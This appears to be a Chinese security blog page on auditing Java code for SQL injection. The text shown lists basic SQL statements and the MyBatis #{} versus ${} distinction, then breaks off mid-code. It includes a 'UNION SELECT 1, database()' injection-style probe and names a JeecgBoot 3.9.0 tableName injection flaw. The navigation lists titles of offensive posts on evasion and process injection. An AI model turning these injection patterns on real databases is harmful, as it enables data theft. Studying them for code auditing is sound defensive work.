<!DOCTYPE html>
<html lang="zh-CN" dir="ltr">
<head>
  <!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content=" 常见基本SQL语句# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 -- 查询users表所有列 SELECT * FROM users; -- 查询users表特定列：id, username, email SELECT id, username, email FROM users; -- 带条件查询 SELECT * FROM users WHERE id = 1; SELECT * FROM users WHERE username = &#39;admin&#39; AND status = 1; -- 模糊查询 -- 查询名字以 &#39;admin&#39; 开头的用户 SELECT * FROM users WHERE username LIKE &#39;admin%&#39;; -- 查询名字包含 &#39;test&#39; 的用户 SELECT * FROM users WHERE username LIKE &#39;%test%&#39;; -- 排序 (ORDER BY) -- 按 ID 升序 SELECT * FROM users ORDER BY id ASC; -- 按创建时间降序 SELECT * FROM users ORDER BY create_time DESC; -- 聚合函数 -- 统计总行数 SELECT COUNT(*) FROM users; -- 计算平均值 SELECT AVG(age) FROM users; -- 分组统计 SELECT role, COUNT(*) FROM users GROUP BY role; -- 联合查询 (UNION) SELECT id, username FROM users UNION SELECT 1, database(); -- 插入数据 (INSERT) -- 插入单条数据 INSERT INTO users (username, password, email) VALUES (&#39;test_user&#39;, &#39;123456&#39;, &#39;test@example.com&#39;); -- 插入多条数据 INSERT INTO users (username, password) VALUES (&#39;user1&#39;, &#39;pass1&#39;), (&#39;user2&#39;, &#39;pass2&#39;); -- 更新数据 (UPDATE) 注意：一定要带 WHERE 条件，否则会更新整张表 -- 更新特定用户的密码 UPDATE users SET password = &#39;new_password&#39; WHERE id = 10; -- 同时更新多个字段 UPDATE users SET status = 0, update_time = NOW() WHERE username = &#39;admin&#39;; -- 删除数据 (DELETE) 注意：一定要带 WHERE 条件，否则会清空整张表 -- 删除特定 ID 的记录 DELETE FROM users WHERE id = 5; -- 删除状态为禁用的用户 DELETE FROM users WHERE status = -1; Mybatis框架# #{} 用于预编译的 SQL 语句中，是预编译处理（安全）。 ${} 则用于动态 SQL 语句中，是直接字符串替换（危险），字符串拼接。 Mybatis Plus框架# 审计MyBatis Plus框架中的SQL注入问题，核心在于识别动态SQL拼接的场景。
">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://Fivesix567.github.io/posts/2026/01/java-sql-injection/">
  <meta property="og:site_name" content="Fivesix&#39;s blog">
  <meta property="og:title" content="Sql注入">
  <meta property="og:description" content="常见基本SQL语句# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 -- 查询users表所有列 SELECT * FROM users; -- 查询users表特定列：id, username, email SELECT id, username, email FROM users; -- 带条件查询 SELECT * FROM users WHERE id = 1; SELECT * FROM users WHERE username = &#39;admin&#39; AND status = 1; -- 模糊查询 -- 查询名字以 &#39;admin&#39; 开头的用户 SELECT * FROM users WHERE username LIKE &#39;admin%&#39;; -- 查询名字包含 &#39;test&#39; 的用户 SELECT * FROM users WHERE username LIKE &#39;%test%&#39;; -- 排序 (ORDER BY) -- 按 ID 升序 SELECT * FROM users ORDER BY id ASC; -- 按创建时间降序 SELECT * FROM users ORDER BY create_time DESC; -- 聚合函数 -- 统计总行数 SELECT COUNT(*) FROM users; -- 计算平均值 SELECT AVG(age) FROM users; -- 分组统计 SELECT role, COUNT(*) FROM users GROUP BY role; -- 联合查询 (UNION) SELECT id, username FROM users UNION SELECT 1, database(); -- 插入数据 (INSERT) -- 插入单条数据 INSERT INTO users (username, password, email) VALUES (&#39;test_user&#39;, &#39;123456&#39;, &#39;test@example.com&#39;); -- 插入多条数据 INSERT INTO users (username, password) VALUES (&#39;user1&#39;, &#39;pass1&#39;), (&#39;user2&#39;, &#39;pass2&#39;); -- 更新数据 (UPDATE) 注意：一定要带 WHERE 条件，否则会更新整张表 -- 更新特定用户的密码 UPDATE users SET password = &#39;new_password&#39; WHERE id = 10; -- 同时更新多个字段 UPDATE users SET status = 0, update_time = NOW() WHERE username = &#39;admin&#39;; -- 删除数据 (DELETE) 注意：一定要带 WHERE 条件，否则会清空整张表 -- 删除特定 ID 的记录 DELETE FROM users WHERE id = 5; -- 删除状态为禁用的用户 DELETE FROM users WHERE status = -1; Mybatis框架# #{} 用于预编译的 SQL 语句中，是预编译处理（安全）。 ${} 则用于动态 SQL 语句中，是直接字符串替换（危险），字符串拼接。 Mybatis Plus框架# 审计MyBatis Plus框架中的SQL注入问题，核心在于识别动态SQL拼接的场景。">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-31T23:35:55+08:00">
    <meta property="article:modified_time" content="2026-01-31T23:35:55+08:00">


  <meta itemprop="name" content="Sql注入">
  <meta itemprop="description" content="常见基本SQL语句# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 -- 查询users表所有列 SELECT * FROM users; -- 查询users表特定列：id, username, email SELECT id, username, email FROM users; -- 带条件查询 SELECT * FROM users WHERE id = 1; SELECT * FROM users WHERE username = &#39;admin&#39; AND status = 1; -- 模糊查询 -- 查询名字以 &#39;admin&#39; 开头的用户 SELECT * FROM users WHERE username LIKE &#39;admin%&#39;; -- 查询名字包含 &#39;test&#39; 的用户 SELECT * FROM users WHERE username LIKE &#39;%test%&#39;; -- 排序 (ORDER BY) -- 按 ID 升序 SELECT * FROM users ORDER BY id ASC; -- 按创建时间降序 SELECT * FROM users ORDER BY create_time DESC; -- 聚合函数 -- 统计总行数 SELECT COUNT(*) FROM users; -- 计算平均值 SELECT AVG(age) FROM users; -- 分组统计 SELECT role, COUNT(*) FROM users GROUP BY role; -- 联合查询 (UNION) SELECT id, username FROM users UNION SELECT 1, database(); -- 插入数据 (INSERT) -- 插入单条数据 INSERT INTO users (username, password, email) VALUES (&#39;test_user&#39;, &#39;123456&#39;, &#39;test@example.com&#39;); -- 插入多条数据 INSERT INTO users (username, password) VALUES (&#39;user1&#39;, &#39;pass1&#39;), (&#39;user2&#39;, &#39;pass2&#39;); -- 更新数据 (UPDATE) 注意：一定要带 WHERE 条件，否则会更新整张表 -- 更新特定用户的密码 UPDATE users SET password = &#39;new_password&#39; WHERE id = 10; -- 同时更新多个字段 UPDATE users SET status = 0, update_time = NOW() WHERE username = &#39;admin&#39;; -- 删除数据 (DELETE) 注意：一定要带 WHERE 条件，否则会清空整张表 -- 删除特定 ID 的记录 DELETE FROM users WHERE id = 5; -- 删除状态为禁用的用户 DELETE FROM users WHERE status = -1; Mybatis框架# #{} 用于预编译的 SQL 语句中，是预编译处理（安全）。 ${} 则用于动态 SQL 语句中，是直接字符串替换（危险），字符串拼接。 Mybatis Plus框架# 审计MyBatis Plus框架中的SQL注入问题，核心在于识别动态SQL拼接的场景。">
  <meta itemprop="datePublished" content="2026-01-31T23:35:55+08:00">
  <meta itemprop="dateModified" content="2026-01-31T23:35:55+08:00">
  <meta itemprop="wordCount" content="2062">

<title>Sql注入 | Fivesix&#39;s blog</title>
<link rel="icon" href="/favicon.png" >
<link rel="manifest" href="/manifest.json">
<link rel="canonical" href="https://Fivesix567.github.io/posts/2026/01/java-sql-injection/">
<link rel="stylesheet" href="/book.min.d8f79ed853197a024be71c3620a88cc516c48531cb27487af5787b9fec2e1480.css" integrity="sha256-2Pee2FMZegJL5xw2IKiMxRbEhTHLJ0h69Xh7n&#43;wuFIA=" crossorigin="anonymous">


  <script defer src="/fuse.min.js"></script>
  <script defer src="/zh.search.min.a0d58115332626557bf63784370e1a5bc09aba05ee7fa06aaf0e13dfa782e100.js" integrity="sha256-oNWBFTMmJlV79jeENw4aW8CaugXuf6Bqrw4T36eC4QA=" crossorigin="anonymous"></script>



  
</head>
<body dir="ltr" class="book-kind-page book-type-posts">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    
<aside class="book-menu">
  <div class="book-menu-content">
    
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Fivesix&#39;s blog</span>
  </a>
</h2>


<div class="book-search hidden">
  <input id="book-search-input" type="text" 
    placeholder="搜索"
    aria-label="搜索"
    maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>






<ul><li><a href="/about/">关于我</a></li></ul>








  
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-2b813d7f3301d6d355367b0b6410c384" class="toggle"  />
    <label for="section-2b813d7f3301d6d355367b0b6410c384" class="flex">
      <a role="button" class="">
        AI</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/ai-security/" class="">
      AI 安全</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-cf794615c746a74a440cfd220c41d474" class="toggle"  />
    <label for="section-cf794615c746a74a440cfd220c41d474" class="flex">
      <a role="button" class="">
        免杀&amp;Tip</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-d1941d8baf6acf73faccdcf1cc3380c7" class="toggle"  />
    <label for="section-d1941d8baf6acf73faccdcf1cc3380c7" class="flex">
      <a role="button" class="">
        沙箱绕过</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/delay-execution/" class="">
      延迟执行</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-3d116816f113e70938dfddc213a6cf23" class="toggle"  />
    <label for="section-3d116816f113e70938dfddc213a6cf23" class="flex">
      <a role="button" class="">
        CobaltStrike</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/cs-dev/" class="">
      Cobaltstrike二开</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/hide-console-window/" class="">
      隐藏控制台窗口</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/windows-add-user/" class="">
      Windows添加用户</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/pe-file-structure/" class="">
      PE文件结构</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/windows-api-levels/" class="">
      Windows API 调用层级</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/apc-local-injection/" class="">
      APCLocalInjection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/create-thread-injection/" class="">
      CreateThreadInjection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/local-process-injection/" class="">
      LocalProcessInjection</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-b0eac0bda1d9d6d5c075a4b42d2665a8" class="toggle" checked />
    <label for="section-b0eac0bda1d9d6d5c075a4b42d2665a8" class="flex">
      <a role="button" class="">
        WebSec</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-0b2de9e9083e920768ff58d4cabf97d4" class="toggle"  />
    <label for="section-0b2de9e9083e920768ff58d4cabf97d4" class="flex">
      <a role="button" class="">
        SQL 注入</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-56060fd95a1c74d77d0aa24143c8911f" class="toggle"  />
    <label for="section-56060fd95a1c74d77d0aa24143c8911f" class="flex">
      <a role="button" class="">
        MySQL 注入</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/mysql-injection/" class="">
      MySQL injection</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-cddfcc9f8964675d6681426d48e296a9" class="toggle" checked />
    <label for="section-cddfcc9f8964675d6681426d48e296a9" class="flex">
      <a role="button" class="">
        代码审计</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-6557978e1f7e4b2d90a5b34a03924209" class="toggle" checked />
    <label for="section-6557978e1f7e4b2d90a5b34a03924209" class="flex">
      <a role="button" class="">
        java</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/java-sql-injection/" class="active">
      Sql注入</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-b74825716f4fa919ae6770cc84777437" class="toggle"  />
    <label for="section-b74825716f4fa919ae6770cc84777437" class="flex">
      <a role="button" class="">
        生活随笔</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/posts/2026/01/my-first-post/" class="">
      My First Post</a>
  

        </li>
      
    
  </ul>










<ul><li><a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo 官网</a></li></ul>




</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>



  </div>
</aside>
 

    <div class="book-page">
      <header class="book-header hidden">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <h3>Sql注入</h3>

  <label for="toc-control">
    
    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#常见基本sql语句">常见基本SQL语句</a></li>
    <li><a href="#mybatis框架">Mybatis框架</a></li>
    <li><a href="#mybatis-plus框架">Mybatis Plus框架</a>
      <ul>
        <li><a href="#jeecgboot-390-sysdictloadtreedata--tablename参数sql-注入"><strong>JeecgBoot 3.9.0 /sys/dict/loadTreeData tableName参数SQL 注入</strong></a></li>
      </ul>
    </li>
    <li><a href="#jdbc-框架">JDBC 框架</a></li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
<article class="markdown book-post">
  <h1>
    Sql注入
  </h1>
  
  <div class="flex align-center text-small book-post-date">
    <img src="/icons/calendar.svg" class="book-icon" alt="Calendar" />
    <span>2026年01月31日</span>
  </div>



  

  


  <div class="book-post-content markdown-inner"><!-- 在这里开始写你的文章... -->
<h2 id="常见基本sql语句">常见基本SQL语句<a class="anchor" href="#%e5%b8%b8%e8%a7%81%e5%9f%ba%e6%9c%acsql%e8%af%ad%e5%8f%a5">#</a></h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#6272a4">-- 查询users表所有列
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 查询users表特定列：id, username, email
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> id, username, email <span style="color:#ff79c6">FROM</span> users;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 带条件查询
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">WHERE</span> id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">WHERE</span> username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;admin&#39;</span> <span style="color:#ff79c6">AND</span> status <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 模糊查询
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 查询名字以 &#39;admin&#39; 开头的用户
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">WHERE</span> username <span style="color:#ff79c6">LIKE</span> <span style="color:#f1fa8c">&#39;admin%&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 查询名字包含 &#39;test&#39; 的用户
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">WHERE</span> username <span style="color:#ff79c6">LIKE</span> <span style="color:#f1fa8c">&#39;%test%&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 排序 (ORDER BY)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 按 ID 升序
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">ORDER</span> <span style="color:#ff79c6">BY</span> id <span style="color:#ff79c6">ASC</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 按创建时间降序
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">ORDER</span> <span style="color:#ff79c6">BY</span> create_time <span style="color:#ff79c6">DESC</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 聚合函数
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 统计总行数
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">COUNT</span>(<span style="color:#ff79c6">*</span>) <span style="color:#ff79c6">FROM</span> users;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 计算平均值
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">AVG</span>(age) <span style="color:#ff79c6">FROM</span> users;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 分组统计
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">role</span>, <span style="color:#ff79c6">COUNT</span>(<span style="color:#ff79c6">*</span>) <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">GROUP</span> <span style="color:#ff79c6">BY</span> <span style="color:#ff79c6">role</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 联合查询 (UNION)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> id, username <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">UNION</span> <span style="color:#ff79c6">SELECT</span> <span style="color:#bd93f9">1</span>, <span style="color:#ff79c6">database</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 插入数据 (INSERT)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 插入单条数据
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">INSERT</span> <span style="color:#ff79c6">INTO</span> users (username, password, email) <span style="color:#ff79c6">VALUES</span> (<span style="color:#f1fa8c">&#39;test_user&#39;</span>, <span style="color:#f1fa8c">&#39;123456&#39;</span>, <span style="color:#f1fa8c">&#39;test@example.com&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 插入多条数据
